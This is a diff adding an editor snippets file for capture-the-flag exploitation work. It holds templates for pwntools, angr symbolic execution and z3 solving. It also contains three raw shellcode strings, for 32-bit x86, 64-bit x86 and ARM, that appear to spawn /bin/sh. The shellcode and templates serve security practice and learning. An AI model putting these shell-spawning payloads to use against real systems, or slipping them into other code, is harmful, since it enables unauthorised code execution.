@@ -1,0 +1,82 @@
+snippet pwn
+	#!/usr/bin/env python
+	# -*- coding: utf-8 -*-
+	from pwn import *   # pip install pwntools
+	
+	if "remote" in sys.argv:
+		r = remote("localhost", 4000)
+	else:
+		r = process("./bin")
+	
+	r.interactive()
+snippet angr
+	#!/usr/bin/env python
+	# -*- coding: utf-8 -*-
+	import angr
+	import simuvex
+	import claripy
+	
+	angr.l.setLevel("DEBUG")
+	p = angr.Project("./vul", load_options={"auto_load_libs": False})
+	
+	add_options = {
+		#"BYPASS_UNSUPPORTED_SYSCALL",
+		#simuvex.o.LAZY_SOLVES,
+	}
+	st = p.factory.entry_state(add_options=add_options)
+	#argv1 = claripy.BVS("argv1", 8 * 100)
+	#st = p.factory.entry_state(args=[p.filename, argv1], add_options=add_options)
+	#st = p.factory.blank_state(addr=main, add_options=add_options)
+	
+	#for c in argv1.chop(8):
+	#    st.add_constraints(c >= ' ')
+	#    st.add_constraints(c <= '~')
+	#st.add_constraints(argv1.get_byte(0) == 'C')
+	#st.add_constraints(argv1.get_byte(0) >= argv[1].get_byte(1))
+	#st.libc.buf_symbolic_bytes = 100
+	
+	pg = p.factory.path_group(st, immutable=False, threads=4, veritesting=True)
+	
+	find_addrs = (0x400546, )
+	avoid_addrs = ()
+	pg.explore(find=find_addrs, avoid=avoid_addrs)
+	print pg
+
+	if pg.found:
+	    fs = pg.found[0].state
+	    #print fs.se.any_str(argv1)    # argv1
+	    #print fs.se.posix.dumps(0)    # stdin
+	    #print fs.se.any_str(fs.memory.load(0x601050, 29)) # mem
+snippet sc32
+	"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
+snippet sc64
+	"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+snippet scarm
+	"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
+snippet r
+	r.recvuntil("${1}")
+snippet s
+	r.sendline(${1})
+snippet sa
+	r.sendlineafter("${1}", "${2}")
+snippet inter
+	r.interactive()
+snippet z3
+	#!/usr/bin/env python
+	# -*- coding: utf-8 -*-
+	from z3 import *
+	
+	x = [BitVec("x_%d" % i, 8) for i in range(32)]
+	
+	s = Solver()
+	s.add()
+	
+	assert s.check() == sat
+
+	m = s.model()
+	print "".join([chr(m[x[i]].as_long()) for i in range(32)])
+snippet rand
+	import ctypes
+	LIBC = ctypes.cdll.LoadLibrary("libc.so.6")
+	LIBC.srand(LIBC.time(0))
+	LIBC.rand()
